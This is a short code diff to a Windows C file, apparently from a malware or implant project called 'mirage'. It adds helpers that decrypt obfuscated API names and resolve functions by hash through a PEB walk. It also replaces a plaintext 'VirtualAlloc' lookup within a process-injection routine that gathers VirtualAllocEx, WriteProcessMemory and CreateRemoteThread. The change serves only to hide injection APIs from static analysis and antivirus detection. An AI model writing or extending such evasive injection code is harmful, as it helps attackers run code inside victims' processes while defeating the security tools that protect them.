@@ -8,6 +8,17 @@
 #include <string.h>
 #include <tlhelp32.h>
 
+/* ── Inline helpers for encrypted PEB-walk resolution ──────── */
+static inline void *resolve_mod_enc(const uint8_t *enc, size_t len) {
+    char buf[32]; enc_decrypt(enc, len, buf);
+    return mirage_get_module_by_hash(mirage_encrypted_hash_module(buf));
+}
+static inline void *resolve_fn_enc(void *mod, const uint8_t *enc, size_t len) {
+    char buf[32]; enc_decrypt(enc, len, buf);
+    return mirage_get_function_by_hash(mod, mirage_encrypted_hash_func(buf));
+}
+
+
 #ifdef ENABLE_PROCESS_INJECTION
 
 /* PEB-walk API resolution */
@@ -65,7 +76,7 @@ static int inj_ensure_api(void) {
     inj_api.pCPA = (pCreateProcessA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
     enc_decrypt(enc_VirtualAllocEx, ENC_VIRTUALALLOCEX_LEN, fn);
     inj_api.pVAE = (pVirtualAllocEx)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
-    inj_api.pVA = (pVirtualAlloc)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func("VirtualAlloc"));
+    inj_api.pVA = (pVirtualAlloc)resolve_fn_enc(k32, enc_VirtualAlloc, ENC_VIRTUALALLOC_LEN);
     enc_decrypt(enc_WriteProcessMemory, ENC_WRITEPROCESSMEMORY_LEN, fn);
     inj_api.pWPM = (pWriteProcessMemory)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
     enc_decrypt(enc_CreateRemoteThread, ENC_CREATEREMOTETHREAD_LEN, fn);
